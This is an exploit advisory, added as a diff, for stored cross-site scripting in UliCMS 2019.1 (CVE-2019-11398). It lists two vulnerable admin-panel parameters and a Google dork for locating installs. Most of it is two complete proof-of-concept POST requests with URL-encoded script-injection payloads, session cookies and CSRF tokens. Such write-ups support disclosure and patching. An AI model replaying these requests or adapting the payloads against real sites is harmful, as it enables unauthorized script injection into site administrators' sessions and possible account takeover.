@@ -1,0 +1,65 @@
+# Exploit Title: UliCMS 2019.1 "Spitting Lama" - Stored Cross-Site Scripting
+# Google Dork: intext:"by UliCMS"
+# Date: 2019-05-12
+# Exploit Author: Unk9vvN
+# Vendor Homepage: https://en.ulicms.de
+# Software Link: https://www.ulicms.de/aktuelles.html?single=ulicms-20191-spitting-lama-ist-fertig
+# Version: 2019.1
+# Tested on: Kali Linux
+# CVE : CVE-2019-11398
+
+
+# Description
+# This vulnerability is in the authentication state and is located in the CMS management panel, and the type of vulnerability is Stored and the vulnerability parameters are as follows.
+
+# Vuln One
+# URI: POST /ulicms/admin/index.php?action=languages
+# Parameter: name="><script>alert('UNK9VVN')</script>
+
+# Vuln Two
+# URI: POST /ulicms/admin/index.php?action=pages_edit&page=23
+# Parameter: systemname="><script>alert('UNK9VVN')</script>
+
+
+#
+# PoC POST (Cross Site Scripting Stored)
+#
+POST /ulicms/admin/index.php HTTP/1.1
+Host: XXXXXXXX.ngrok.io
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://XXXXXXXX.ngrok.io/ulicms/admin/index.php?action=languages
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+Cookie: 5cfc346c4b87e_SESSION=mm4j0oak7boshm2fsn5ttimip8
+Connection: close
+Upgrade-Insecure-Requests: 1
+DNT: 1
+
+csrf_token=c95ab2823eccb876804606aa6c60f4d9&sClass=LanguageController&sMethod=create&language_code=U9N&name=%22%3E%3Cscript%3Ealert%28%27UNK9VVN%27%29%3C%2Fscript%3E
+
+
+#
+# PoC POST (Cross Site Scripting Stored)
+#
+POST /ulicms/admin/index.php HTTP/1.1
+Host: XXXXXXXX.ngrok.io
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://XXXXXXXX.ngrok.io/ulicms/admin/index.php?action=pages_edit&page=23
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 904
+Cookie: 5cfc346c4b87e_SESSION=mm4j0oak7boshm2fsn5ttimip8
+Connection: close
+DNT: 1
+
+csrf_token=c95ab2823eccb876804606aa6c60f4d9&sClass=PageController&sMethod=edit&edit_page=edit_page&page_id=23&systemname=%22%3E%3Cscript%3Ealert%28%27UNK9VVN%27%29%3C%2Fscript%3E&page_title=UNK9VVN&alternate_title=assdasdasd&show_headline=1&type=page&language=en&menu=top&position=0&parent=NULL&activated=1&target=_self&hidden=0&category=1&menu_image=&redirection=&link_to_language=&meta_description=&meta_keywords=&article_author_name=&article_author_email=&comment_homepage=&article_date=2019-06-09T00%3A40%3A01&excerpt=&og_title=&og_description=&og_type=&og_image=&list_type=null&list_language=&list_category=0&list_menu=&list_parent=NULL&list_order_by=title&list_order_direction=asc&limit=0&list_use_pagination=0&module=null&video=&audio=&image_url=&text_position=before&article_image=&autor=1&group_id=1&comments_enabled=null&cache_control=auto&theme=&access%5B%5D=all&custom_data=%7B%0A%0A%7D&page_content=
+
+
+# Discovered by:
+t.me/Unk9vvN
